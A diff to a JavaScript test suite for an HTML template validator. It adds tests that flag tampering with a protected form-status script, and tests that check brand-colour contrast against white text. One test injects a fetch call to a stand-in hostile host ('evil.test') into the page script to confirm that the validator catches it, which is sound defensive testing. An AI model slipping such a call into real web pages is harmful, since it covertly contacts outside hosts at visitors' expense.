@@ -2,7 +2,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
-import { checkHtml, checkPaths } from "./validate.mjs";
+import { checkHtml, checkPaths, contrast } from "./validate.mjs";
 
 const formAction = "https://portal.test/api/forms/joe";
 const good = readFileSync(new URL("../templates/trades/index.html", import.meta.url), "utf8")
@@ -27,6 +27,19 @@ test("the form, footer, placeholders, and em dashes are protected", () => {
   assert.ok(checkHtml(good.replace("Site by", "Made by"), { formAction }).some((p) => p.includes("footer")));
   assert.ok(checkHtml(good.replace("<h1", "<h1>{{HEADLINE}}</h1><h1"), { formAction }).some((p) => p.includes("PLACEHOLDERS")));
   assert.ok(checkHtml(good.replace("</h1>", " \u2014 now</h1>"), { formAction }).some((p) => p.includes("em dash")));
+});
+
+test("the form-status script can't be edited, even though it's allowed", () => {
+  const edited = good.replace('document.getElementById("yr")', 'fetch("https://evil.test");document.getElementById("yr")');
+  assert.ok(checkHtml(edited, { formAction }).some((p) => p.includes("form-status")));
+});
+
+test("the brand color keeps white text readable", () => {
+  assert.equal(contrast("#ffffff", "#000000").toFixed(0), "21");
+  const livery = (c) => checkHtml(good.replace("--livery:#14532d", `--livery:${c}`), { formAction });
+  assert.deepEqual(livery("#7a1f1f"), []);
+  assert.ok(livery("#b45309").some((p) => p.includes("too light"))); // burnt orange: 5.0:1
+  assert.ok(livery("rgb(20,83,45)").some((p) => p.includes("6-digit hex")));
 });
 
 test("only the request's own site folder may change", () => {
